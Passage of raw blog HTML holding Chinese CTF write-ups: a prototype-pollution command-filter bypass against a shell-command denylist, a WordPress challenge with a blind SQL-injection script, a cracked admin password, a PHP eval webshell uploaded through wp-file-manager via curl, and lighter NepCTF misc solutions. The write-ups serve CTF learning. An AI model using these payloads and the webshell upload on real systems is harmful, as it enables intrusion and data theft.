class="string">&quot;arpd&quot;</span>, <span class="string">&quot;delpart&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;chcpu&quot;</span>, <span class="string">&quot;capsh&quot;</span>, <span class="string">&quot;ctrlaltdel&quot;</span>, <span class="string">&quot;bridge&quot;</span>, <span class="string">&quot;less&quot;</span>, <span class="string">&quot;gpgsplit&quot;</span>, <span class="string">&quot;pgrep&quot;</span>, <span class="string">&quot;truncate&quot;</span>, <span class="string">&quot;localedef&quot;</span>, <span class="string">&quot;printf&quot;</span>, <span class="string">&quot;gencat&quot;</span>, <span class="string">&quot;sed&quot;</span>, <span class="string">&quot;ptx&quot;</span>, <span class="string">&quot;nm&quot;</span>, <span class="string">&quot;pwmake&quot;</span>, <span class="string">&quot;zmore&quot;</span>, <span class="string">&quot;tzselect&quot;</span>, <span class="string">&quot;script&quot;</span>, <span class="string">&quot;dnsdomainname&quot;</span>, <span class="string">&quot;ar&quot;</span>, <span class="string">&quot;more&quot;</span>, <span class="string">&quot;journalctl&quot;</span>, <span class="string">&quot;gunzip&quot;</span>, <span class="string">&quot;makedb&quot;</span>, <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;col&quot;</span>, <span class="string">&quot;sync&quot;</span>, <span class="string">&quot;vi&quot;</span>, <span class="string">&quot;locale&quot;</span>, <span class="string">&quot;prlimit&quot;</span>, <span class="string">&quot;nisdomainname&quot;</span>, <span class="string">&quot;timedatectl&quot;</span>, <span class="string">&quot;ipcmk&quot;</span>, <span class="string">&quot;isosize&quot;</span>, <span class="string">&quot;free&quot;</span>, <span class="string">&quot;alias&quot;</span>, <span class="string">&quot;taskset&quot;</span>, <span class="string">&quot;factor&quot;</span>, <span class="string">&quot;pinky&quot;</span>, <span class="string">&quot;arch&quot;</span>, <span class="string">&quot;lscpu&quot;</span>, <span class="string">&quot;awk&quot;</span>, <span class="string">&quot;tty&quot;</span>, <span class="string">&quot;xmllint&quot;</span>, <span class="string">&quot;xzcmp&quot;</span>, <span class="string">&quot;readelf&quot;</span>, <span class="string">&quot;kdumpctl&quot;</span>, <span class="string">&quot;tsort&quot;</span>, <span class="string">&quot;nice&quot;</span>, <span class="string">&quot;cal&quot;</span>, <span class="string">&quot;rpmdb&quot;</span>, <span class="string">&quot;newgrp&quot;</span>, <span class="string">&quot;xmlwf&quot;</span>, <span class="string">&quot;slabtop&quot;</span>, <span class="string">&quot;utmpdump&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;basename&quot;</span>, <span class="string">&quot;eject&quot;</span>, <span class="string">&quot;ranlib&quot;</span>, <span class="string">&quot;wall&quot;</span>, <span class="string">&quot;zless&quot;</span>, <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;nsenter&quot;</span>, <span class="string">&quot;getent&quot;</span>, <span class="string">&quot;chrt&quot;</span>, <span class="string">&quot;mount&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;systemctl&quot;</span>, <span class="string">&quot;vmstat&quot;</span>, <span class="string">&quot;xmlcatalog&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;lsinitrd&quot;</span>, <span class="string">&quot;tload&quot;</span>, <span class="string">&quot;chmod&quot;</span>, <span class="string">&quot;setsid&quot;</span>, <span class="string">&quot;getopts&quot;</span>, <span class="string">&quot;colcrt&quot;</span>, <span class="string">&quot;su&quot;</span>, <span class="string">&quot;lsipc&quot;</span>, <span class="string">&quot;login&quot;</span>, <span class="string">&quot;lsns&quot;</span>, <span class="string">&quot;unalias&quot;</span>, <span class="string">&quot;lastb&quot;</span>, <span class="string">&quot;df&quot;</span>, <span class="string">&quot;gpg&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;gpgv&quot;</span>, <span class="string">&quot;pathchk&quot;</span>, <span class="string">&quot;groups&quot;</span>, <span class="string">&quot;lsmem&quot;</span>, <span class="string">&quot;users&quot;</span>, <span class="string">&quot;as&quot;</span>, <span class="string">&quot;ipcs&quot;</span>, <span class="string">&quot;jobs&quot;</span>, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;iconv&quot;</span>, <span class="string">&quot;dwp&quot;</span>, <span class="string">&quot;domainname&quot;</span>, <span class="string">&quot;xzcat&quot;</span>, <span class="string">&quot;ldd&quot;</span>, <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;strip&quot;</span>, <span class="string">&quot;dircolors&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;trust&quot;</span>, <span class="string">&quot;stty&quot;</span>, <span class="string">&quot;ul&quot;</span>, <span class="string">&quot;chacl&quot;</span>, <span class="string">&quot;loginctl&quot;</span>, <span class="string">&quot;gzip&quot;</span>, <span class="string">&quot;xzmore&quot;</span>, <span class="string">&quot;zcat&quot;</span>, <span class="string">&quot;busctl&quot;</span>, <span class="string">&quot;fincore&quot;</span>, <span class="string">&quot;fgrep&quot;</span>, <span class="string">&quot;dmesg&quot;</span>, <span class="string">&quot;rm&quot;</span>, <span class="string">&quot;mv&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;lslogins&quot;</span>, <span class="string">&quot;numfmt&quot;</span>, <span class="string">&quot;flock&quot;</span>, <span class="string">&quot;realpath&quot;</span>, <span class="string">&quot;find&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;lesskey&quot;</span>, <span class="string">&quot;printenv&quot;</span>, <span class="string">&quot;du&quot;</span>, <span class="string">&quot;grep&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;tee&quot;</span>, <span class="string">&quot;rename&quot;</span>, <span class="string">&quot;gawk&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;sg&quot;</span>, <span class="string">&quot;xzegrep&quot;</span>, <span class="string">&quot;xzdec&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;whereis&quot;</span>, <span class="string">&quot;strings&quot;</span>, <span class="string">&quot;setfacl&quot;</span>, <span class="string">&quot;mkfifo&quot;</span>, <span class="string">&quot;chage&quot;</span>, <span class="string">&quot;xzgrep&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;rvi&quot;</span>, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;ypdomainname&quot;</span>, <span class="string">&quot;tr&quot;</span>, <span class="string">&quot;umount&quot;</span>, <span class="string">&quot;rev&quot;</span>, <span class="string">&quot;wdctl&quot;</span>, <span class="string">&quot;uniq&quot;</span>, <span class="string">&quot;ps&quot;</span>, <span class="string">&quot;stdbuf&quot;</span>, <span class="string">&quot;chgrp&quot;</span>, <span class="string">&quot;setarch&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;dirmngr&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;lastlog&quot;</span>, <span class="string">&quot;gsettings&quot;</span>, <span class="string">&quot;ex&quot;</span>, <span class="string">&quot;ipcrm&quot;</span>, <span class="string">&quot;cp&quot;</span>, <span class="string">&quot;fallocate&quot;</span>, <span class="string">&quot;colrm&quot;</span>, <span class="string">&quot;rpm&quot;</span>, <span class="string">&quot;pwdx&quot;</span>, <span class="string">&quot;xargs&quot;</span>, <span class="string">&quot;objdump&quot;</span>, <span class="string">&quot;ld&quot;</span>, <span class="string">&quot;chcon&quot;</span>, <span class="string">&quot;skill&quot;</span>, <span class="string">&quot;yum&quot;</span>, <span class="string">&quot;who&quot;</span>, <span class="string">&quot;gapplication&quot;</span>, <span class="string">&quot;stat&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;uuidgen&quot;</span>, <span class="string">&quot;logger&quot;</span>, <span class="string">&quot;pwscore&quot;</span>, <span class="string">&quot;xz&quot;</span>, <span class="string">&quot;mesg&quot;</span>, <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;zgrep&quot;</span>, <span class="string">&quot;chmem&quot;</span>, <span class="string">&quot;newuidmap&quot;</span>, <span class="string">&quot;evmctl&quot;</span>, <span class="string">&quot;wc&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;egrep&quot;</span>, <span class="string">&quot;fold&quot;</span>, <span class="string">&quot;zfgrep&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;csplit&quot;</span>, <span class="string">&quot;sum&quot;</span>, <span class="string">&quot;expand&quot;</span>, <span class="string">&quot;getfacl&quot;</span>, <span class="string">&quot;newgidmap&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;install&quot;</span>, <span class="string">&quot;bootctl&quot;</span>, <span class="string">&quot;xzless&quot;</span>, <span class="string">&quot;runcon&quot;</span>, <span class="string">&quot;dirname&quot;</span>, <span class="string">&quot;comm&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;hostname&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;ipcalc&quot;</span>, <span class="string">&quot;unexpand&quot;</span>, <span class="string">&quot;nohup&quot;</span>, <span class="string">&quot;zegrep&quot;</span>, <span class="string">&quot;head&quot;</span>, <span class="string">&quot;getopt&quot;</span>, <span class="string">&quot;raw&quot;</span>, <span class="string">&quot;hexdump&quot;</span>, <span class="string">&quot;mountpoint&quot;</span>, <span class="string">&quot;lslocks&quot;</span>, <span class="string">&quot;coreutils&quot;</span>, <span class="string">&quot;shred&quot;</span>, <span class="string">&quot;sotruss&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;pldd&quot;</span>, <span class="string">&quot;uuidparse&quot;</span>, <span class="string">&quot;localectl&quot;</span>, <span class="string">&quot;gtar&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;znew&quot;</span>, <span class="string">&quot;logname&quot;</span>, <span class="string">&quot;gzexe&quot;</span>, <span class="string">&quot;rpmquery&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span class="string">&quot;cpio&quot;</span>, <span class="string">&quot;sprof&quot;</span>, <span class="string">&quot;hostnamectl&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;uname&quot;</span>, <span class="string">&quot;unxz&quot;</span>, <span class="string">&quot;zdiff&quot;</span>, <span class="string">&quot;gdbus&quot;</span>, <span class="string">&quot;namei&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;kmod&quot;</span>, <span class="string">&quot;info&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;zcmp&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;mktemp&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;column&quot;</span>, <span class="string">&quot;scriptreplay&quot;</span>, <span class="string">&quot;lessecho&quot;</span>, <span class="string">&quot;look&quot;</span>, <span class="string">&quot;setterm&quot;</span>, <span class="string">&quot;gdbmtool&quot;</span>, <span class="string">&quot;rpmkeys&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;gpasswd&quot;</span>, <span class="string">&quot;dracut&quot;</span>, <span class="string">&quot;vdir&quot;</span>, <span class="string">&quot;mcookie&quot;</span>, <span class="string">&quot;elfedit&quot;</span>, <span class="string">&quot;chown&quot;</span>, <span class="string">&quot;objcopy&quot;</span>, <span class="string">&quot;hostid&quot;</span>, <span class="string">&quot;shuf&quot;</span>, <span class="string">&quot;view&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;gpgparsemail&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;tail&quot;</span>, <span class="string">&quot;zforce&quot;</span>, <span class="string">&quot;last&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;ionice&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;resolvectl&quot;</span>, <span class="string">&quot;watchgnupg&quot;</span>, <span class="string">&quot;unshare&quot;</span>, <span class="string">&quot;timeout&quot;</span>, <span class="string">&quot;getconf&quot;</span>, <span class="string">&quot;findmnt&quot;</span>, <span class="string">&quot;pr&quot;</span>, <span class="string">&quot;xzfgrep&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;rview&quot;</span>, <span class="string">&quot;fmt&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;readlink&quot;</span>, <span class="string">&quot;dd&quot;</span>, <span class="string">&quot;paste&quot;</span>, <span class="string">&quot;od&quot;</span>, <span class="string">&quot;setpriv&quot;</span>, <span class="string">&quot;coredumpctl&quot;</span>, <span class="string">&quot;dnf&quot;</span>, <span class="string">&quot;xzdiff&quot;</span>, <span class="string">&quot;renice&quot;</span>, <span class="string">&quot;pkill&quot;</span>, <span class="string">&quot;mkinitrd&quot;</span>, <span class="string">&quot;pmap&quot;</span>, <span class="string">&quot;snice&quot;</span>, <span class="string">&quot;gio&quot;</span>, <span class="string">&quot;gpgconf&quot;</span>, <span class="string">&quot;expr&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;nproc&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;cksum&quot;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&quot;rpmverify&quot;</span>, <span class="string">&quot;lsblk&quot;</span>, <span class="string">&quot;catchsegv&quot;</span>, <span class="string">&quot;uptime&quot;</span>, <span class="string">&quot;seq&quot;</span>, <span class="string">&quot;ln&quot;</span>, <span class="string">&quot;cut&quot;</span>, <span class="string">&quot;bashbug&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;gprof&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;npm&quot;</span>, <span class="string">&quot;corepack&quot;</span>, <span class="string">&quot;npx&quot;</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">eval_chr</span> = [<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>];</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; command.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd.<span class="title function_ invoke__">includes</span>(command[i] + <span class="string">&#x27;&amp;&#x27;</span>) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;&amp;&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(command[i] + <span class="string">&#x27;|&#x27;</span>) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;|&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;;&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;(&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;/&#x27;</span> + command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (let j = <span class="number">0</span>; j &lt; eval_chr.length; j++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cmd.<span class="title function_ invoke__">includes</span>(eval_chr[j])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check_cmd</code>中不允许使用带参数的命令</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令 | 离别歌 (leavesongs.com)</a></p><p>paylaod：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bc645e8b-eeea-4bbe-ae7a-861bd0429a00.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;msg&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;%ff&quot;</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;cmd_rce&quot;</span>: <span class="string">&quot;env $&#x27;cat&#x27; /flag&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193507709-1142423974.png" alt="image-20240606193507546"></p><h2 id="EzPenetration"><a href="#EzPenetration" class="headerlink" title="EzPenetration"></a>EzPenetration</h2><p>一个Wordpress的站点，利用wpscan工具扫描一下<strong>（有token和没token的差距真的很大！）</strong>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.10.10/wordpress -e --api-token xxxxxxxxxxxxxxxxxxx <span class="comment">#-e简单进行整体快速扫描</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193530755-1331602688.png" alt="image-20240606193529910"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193534540-849651288.png" alt="image-20240606193534307"></p><p>发现 <strong>Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</strong> 的漏洞以及yanshu用户</p><p>利用二分法爆破脚本进行数据库爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsGet = &#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;rtec_send_unregister_link&quot;</span>&#125;</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;wp_option&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;touch wp_option&#x27;</span>)  <span class="comment"># 用于记录wp_options表的内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wp_option&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 断点重连</span></span><br><span class="line">        result = f.read()[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    i = <span class="built_in">len</span>(result)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        head = <span class="number">30</span></span><br><span class="line">        tail = <span class="number">130</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            paramsPost = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;r3tr0young@gmail.com&quot;</span>,</span><br><span class="line">                          <span class="string">&quot;event_id&quot;</span>: <span class="string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 16)&gt;<span class="subst">&#123;mid&#125;</span>)-- &quot;</span>&#125;</span><br><span class="line">            cookies = &#123;<span class="string">&quot;wordpress_test_cookie&quot;</span>: <span class="string">&quot;WP%20Cookie%20check&quot;</span>&#125;</span><br><span class="line">            response = session.post(<span class="string">&quot;http://127.0.0.1:8080/wp-admin/admin-ajax.php&quot;</span>, data=paramsPost, params=paramsGet,</span><br><span class="line">                                    cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">30</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wp_option&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restart</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        restart()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        restart()</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193700417-1243153106.png" alt="image-20240606193659818"></p><p>利用脚本爆破密码结合wpscan扫描出来的用户登录</p><blockquote><p>yanshu<br>fO0CO2#0ky#oLgH1JI</p></blockquote><p>登录管理员账号到后台，更改插件的php代码或者安装一个具有漏洞的插件，如wp-file-manager，进行rce</p><p>安装完成后访问<code>/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193743286-1748806443.png" alt="image-20240606193743002"></p><p>出现此界面说明漏洞存在</p><p>准备好一句话木马<code>shell.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用curl命令上传：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F cmd=upload -F target=l1_ -F upload[]=@shell.php -XPOST <span class="string">&quot;http://node4.buuoj.cn:29777/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193805586-837043641.png" alt="image-20240606193805251"></p><p>蚁剑连接:</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193814740-1051079640.png" alt="image-20240606193814588"></p><p>在根目录找到flag：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193820748-29707845.png" alt="image-20240606193820515"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF 2023</title>
      <link href="/posts/6c75a1e6.html"/>
      <url>/posts/6c75a1e6.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h2><p>将给的代码扔给gpt，发现缺少一段代码，直接让它帮写出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Read frequency information</span></span><br><span class="line">        num_symbols = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">            byte, freq_bytes = f.read(<span class="number">1</span>)[<span class="number">0</span>], f.read(<span class="number">4</span>)</span><br><span class="line">            freq = (freq_bytes[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (freq_bytes[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (freq_bytes[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | freq_bytes[<span class="number">3</span>]</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Rebuild Huffman tree</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read compressed data</span></span><br><span class="line">        compressed_data = f.read()</span><br><span class="line">        bit_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(byte, <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> compressed_data)</span><br><span class="line"></span><br><span class="line">    current_node = root</span><br><span class="line">    decompressed_data = []</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bit_string:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            current_node = current_node.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_node = current_node.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            decompressed_data.append(current_node.char)</span><br><span class="line">            current_node = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>(decompressed_data))</span><br></pre></td></tr></table></figure><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p>进去是个C语言的代码执行器</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191132561-1398252466.png" alt="image-20240607191130216"></p><p>提示说环境变量里面有flag，尝试打印环境变量</p><p><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">linux下获取系统环境变量</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** arge)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(*arge)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *arge++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191149590-996029833.png" alt="image-20240607191146952"></p><h2 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2><p><img 